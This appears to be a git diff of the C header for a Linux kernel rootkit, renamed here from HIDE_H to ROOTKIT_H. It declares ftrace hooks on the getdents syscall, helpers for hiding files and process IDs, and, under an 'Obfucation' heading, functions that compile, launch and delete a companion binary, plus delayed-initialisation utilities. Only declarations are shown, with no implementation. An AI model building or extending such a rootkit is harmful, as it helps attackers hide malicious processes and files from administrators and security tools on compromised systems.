@@ -1,5 +1,5 @@
-#ifndef HIDE_H
-# define HIDE_H
+#ifndef ROOTKIT_H
+# define ROOTKIT_H
 
 # include <linux/init.h>
 # include <linux/module.h>
@@ -18,6 +18,7 @@
 # include <linux/file.h>
 # include <linux/stat.h>
 # include <linux/sched/signal.h>
+# include <linux/namei.h>
 
 // https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
 # pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -31,7 +32,10 @@ typedef struct ftrace_hook {
     struct ftrace_ops ops;
 } t_ftrace_hook;
 
-extern int g_pid_companion;
+extern	int g_pid_companion;
+extern	t_ftrace_hook *g_f_hook[];
+extern	struct workqueue_struct *g_delayed_init_wq;
+extern	struct delayed_work g_delayed_init_work;
 
 asmlinkage long myGetDents(const struct pt_regs *regs);
 
@@ -39,7 +43,18 @@ int fh_install_hook(t_ftrace_hook *hook);
 void fh_remove_hook(t_ftrace_hook *hook);
 extern asmlinkage long (*g_original_getdents)(const struct pt_regs *);
 
+/* Obfucation */
+void compile_companion(void);
+void delete_binary(void);
 void launch_companion(void);
 void get_pid_companion(void);
+bool is_current_file_to_hide(char *filename);
+bool is_a_pid_to_hide(char *filename);
+int loop_current_dirent (int size_dirent, struct linux_dirent64 __user *dirent);
+
+
+/* Delayed Utils */
+bool is_system_ready(void);
+void delayed_module_init_work(struct work_struct *work);
 
 #endif
